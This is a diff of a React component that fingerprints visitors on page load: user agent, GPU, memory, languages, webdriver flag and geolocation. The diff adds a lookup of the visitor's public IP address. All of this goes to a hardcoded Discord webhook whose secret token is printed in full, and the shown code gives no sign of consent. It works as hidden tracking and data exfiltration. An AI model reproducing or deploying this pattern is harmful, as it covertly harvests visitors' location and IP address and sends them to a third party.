@@ -34,24 +34,30 @@ function App() {
         result.languages = navigator.languages;
         result.webdriver = navigator.webdriver;
 
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              result.location = {
-                lat: position.coords.latitude,
-                lng: position.coords.longitude,
-              };
-              setUserInfo(result);
-              console.log("result", result);
-            },
-            () => {
-              // Set a default location if the user denies the location permission
-              result.location = { lat: 0, lng: 0 };
-              setUserInfo(result);
-              console.log("result", result);
+        fetch("https://api.ipify.org/?format=json")
+          .then((response) => {
+            return response.json();
+          }, "jsonp")
+          .then((res) => {
+            result.ip = res.ip;
+            if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                (position) => {
+                  result.location = {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                  };
+                  setUserInfo(result);
+                },
+                () => {
+                  // Set a default location if the user denies the location permission
+                  result.location = { lat: 0, lng: 0 };
+                  setUserInfo(result);
+                }
+              );
             }
-          );
-        }
+          })
+          .catch((err) => console.log(err));
       }
     } catch (error) {
       console.error(error);
@@ -69,13 +75,13 @@ function App() {
       }
       prevUserInfo.current = userInfo;
       const message = `- **User Agent:** ${JSON.stringify(userInfo.userAgent)}\n
-- **Connection:** ${JSON.stringify(navigator.connection.effectiveType)}\n
-- **Device Memory:** ${userInfo.deviceMemory}\n
-- **Location:** ${JSON.stringify(userInfo.location)}\n
-- **GPU:** ${userInfo.gpu}\n
-- **Languages:** ${userInfo.languages}\n
-- **Webdriver:** ${userInfo.webdriver}`;
-      console.log(userInfo.location);
+  - **Connection:** ${JSON.stringify(navigator.connection.effectiveType)}\n
+  - **Device Memory:** ${userInfo.deviceMemory}\n
+  - **Location:** ${JSON.stringify(userInfo.location)}\n
+  - **GPU:** ${userInfo.gpu}\n
+  - **Languages:** ${userInfo.languages}\n
+  - **Webdriver:** ${userInfo.webdriver}\n
+  - **IP Address:** ${userInfo.ip}`;
       try {
         fetch(
           "https://discord.com/api/webhooks/1098651016288800858/Fo4Fg6zES5Ur24KxYVnY9O0Znj4v19-QIU9DL3VhdtHfqI8gkAk8u-TNcmJYUOs2WCms",
@@ -105,7 +111,7 @@ function App() {
     } else {
       console.warn("User info is empty, skipping webhook send.");
     }
-  }, [userInfo]);
+  }, [userInfo, prevUserInfo]);
 
   return (
     <Wrapper theme={theme}>
